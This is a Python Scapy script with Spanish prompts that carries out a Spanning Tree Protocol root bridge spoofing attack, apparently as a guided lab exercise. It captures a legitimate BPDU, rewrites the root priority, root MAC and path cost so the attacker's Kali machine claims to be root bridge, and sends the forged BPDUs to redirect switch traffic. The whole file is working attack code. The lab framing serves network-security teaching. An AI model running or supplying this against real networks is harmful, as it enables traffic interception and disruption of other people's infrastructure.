#!/usr/bin/env python3
from scapy.all import *
import sys
import time
import re

SEPARATOR = "\n" + "=" * 70 + "\n"

def ascii_banner(text):
    print("\n" + "=" * (len(text) + 4))
    print(f"| {text} |")
    print("=" * (len(text) + 4))

def intro():
    ascii_banner("\033[1;34mINICIO DEL ATAQUE SPANNING TREE\033[0m")
    print()
    print("[1] Abre Wireshark y selecciona la interfaz \033[1mswX-p5-kaliX\033[0m")
    print("[2] Observa los paquetes STP legítimos emitidos desde Kali")
    print("[3] Comprende su estructura antes de suplantar el root bridge")
    print()
    input("[ENTER] Continuar cuando Wireshark esté capturando")

def explain_mac_addresses(pkt):
    print(SEPARATOR)
    print("[INFO] Análisis del paquete STP capturado")
    print()
    print("Identificar dos MAC importantes:")
    print("  (1) Kali (interfaz 'swX-p5-kali')")
    print("  (2) Switch legítimo conectado")
    print()
    print("Para obtenerlas:")
    print("  Kali   : 'ip link show'")
    print("  Switch : 'show system'")
    print()
    print("Resumen del paquete:")
    print(f"  Origen      : {pkt.src}")
    print(f"  Destino     : {pkt.dst}  (multicast STP 01:80:c2:00:00:00)")

    stp = pkt.getlayer(STP)
    print(f"  Root Bridge : {stp.rootmac}")
    print("\nEsta es la MAC que se declara como switch raíz (root bridge).")
    print("En el ataque modificaremos esta MAC para fingir que Kali es el root bridge.")
    print("Si se consigue, el tráfico de red se redirigirá hacia Kali.")
    print(SEPARATOR)
    print("Estructura del campo Bridge ID:")
    print("  - 2 bytes: Prioridad (manual + VLAN ID)")
    print("  - 6 bytes: MAC address")
    print("\nPrioridad (16 bits) = [4 bits de prioridad manual] + [12 bits VLAN ID]")
    print("Ejemplo: 0x2000 + VLAN 1 (0x0001) = 0x2001")
    print("\nCuanto más bajo el valor, mayor prioridad tiene ese bridge.")
    print("Usaremos prioridad 0x0000 y MAC falsa convincente para simular ser el root.")
    ascii_banner("\033[1;36mRESUMEN PAQUETE BPDU CAPTURADO\033[0m")

def prompt_or_suggest(field_name, current_val, suggested_val, bits_info, desc, reason):
    print(SEPARATOR)
    print(f"Campo: {field_name}")
    print(f"Bits:  {bits_info}")
    print(f"Descripción: {desc}")
    print(f"Valor actual: 0x{current_val:04x}")
    print(f"Sugerido:     0x{suggested_val:04x}  <- {reason}")
    choice = input("\n¿Usar valor sugerido? [S/n]: ").strip().lower()
    if choice == 'n':
        while True:
            user_input = input("Introduce el nuevo valor en hexadecimal (ej. 2000): ").strip()
            try:
                return int(user_input, 16)
            except ValueError:
                print("Valor no válido. Intenta de nuevo.")
    return suggested_val

def aplicar_modificaciones_base(pkt_base, pkt_modificado):
    if not (pkt_base.haslayer(STP) and pkt_modificado.haslayer(STP)):
        return pkt_base
    stp_base = pkt_base.getlayer(STP)
    stp_mod = pkt_modificado.getlayer(STP)
    stp_base.rootid    = stp_mod.rootid
    stp_base.rootmac   = stp_mod.rootmac
    stp_base.pathcost  = stp_mod.pathcost
    stp_base.bridgeid  = stp_mod.bridgeid
    stp_base.bridgemac = stp_mod.bridgemac
    return pkt_base

def is_valid_mac(mac):
    return re.fullmatch(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", mac) is not None

def prompt_hex_input(prompt_text, default_val):
    while True:
        user_input = input(prompt_text).strip()
        if user_input == '':
            return default_val
        try:
            val = int(user_input, 16)
            if 0x0000 <= val <= 0xFFFF:
                return val
            else:
                print("Valor fuera de rango (0x0000 a 0xFFFF).")
        except ValueError:
            print("Entrada no válida. Usa número hexadecimal (ej. 2000).")

def modify_bpdu(pkt):
    if pkt.haslayer(Dot3) and pkt.haslayer(LLC) and pkt.haslayer(STP):
        stp = pkt.getlayer(STP)

        ascii_banner("PAQUETE BPDU CAPTURADO")
        explain_mac_addresses(pkt)
        stp.show()

        print(SEPARATOR)
        input("Presiona ENTER para modificar los campos clave...")

        stp.rootid = prompt_or_suggest("ID del Root Bridge", stp.rootid, 0x0000, "16 bits", "Prioridad del bridge", "Mayor prioridad posible")
        suggested_mac = pkt.src

        print(SEPARATOR)
        print(f"MAC del Root Bridge actual: {stp.rootmac}")
        print(f"Sugerido: {suggested_mac} (MAC atacante)")
        choice = input("\n¿Usar esta MAC como Root Bridge? [S/n]: ").strip().lower()
        if choice == 'n':
            while True:
                new_mac = input("Introduce MAC (formato aa:bb:cc:dd:ee:ff): ").strip()
                if is_valid_mac(new_mac):
                    stp.rootmac = new_mac
                    break
                else:
                    print("Formato inválido.")
        else:
            stp.rootmac = suggested_mac

        stp.pathcost = prompt_or_suggest("Path Cost", stp.pathcost, 0x0000, "16 bits", "Costo acumulado al Root", "0 indica enlace directo")
        stp.bridgeid = 0x0000
        stp.bridgemac = suggested_mac

        ascii_banner("BPDU FINAL MODIFICADO")
        stp.show()
        return pkt
    else:
        print("El paquete no es BPDU válido.")
        return None

def main():
    intro()
    if len(sys.argv) != 2:
        print(f"\nUso: {sys.argv[0]} <interfaz>")
        sys.exit(1)

    iface = sys.argv[1]
    print(f"\nCapturando paquete STP en interfaz {iface}...")
    pkts = sniff(filter="ether dst 01:80:c2:00:00:00", iface=iface, count=1)
    pkt = pkts[0]

    modified_pkt = modify_bpdu(pkt.copy())

    if modified_pkt:
        input("\nPresiona ENTER para enviar el BPDU modificado...")
        for i in range(3):
            pkt_fresco = sniff(filter="ether dst 01:80:c2:00:00:00", iface=iface, count=1)[0]
            final_pkt = aplicar_modificaciones_base(pkt_fresco.copy(), modified_pkt)
            sendp(final_pkt, iface=iface, verbose=True)
            time.sleep(1)

        ascii_banner("ATAQUE STP LANZADO")
        print("Consulta Wireshark para verificar los cambios en la topología.")
        print("Ejecuta 'show stp s0' en el switch para confirmar el nuevo root.")

        print("\n[INFO] El protocolo STP se recupera si no recibe BPDUs por un tiempo.")
        print("       Dejar de enviar BPDUs maliciosas hará que el switch reevalúe.")

        print("\n[NOTA] Repetir el ataque con una prioridad mayor no tendrá efecto.")
        print("       En STP, las prioridades más bajas tienen mayor peso.")
    else:
        print("No se envió ningún paquete.")

if __name__ == "__main__":
    main()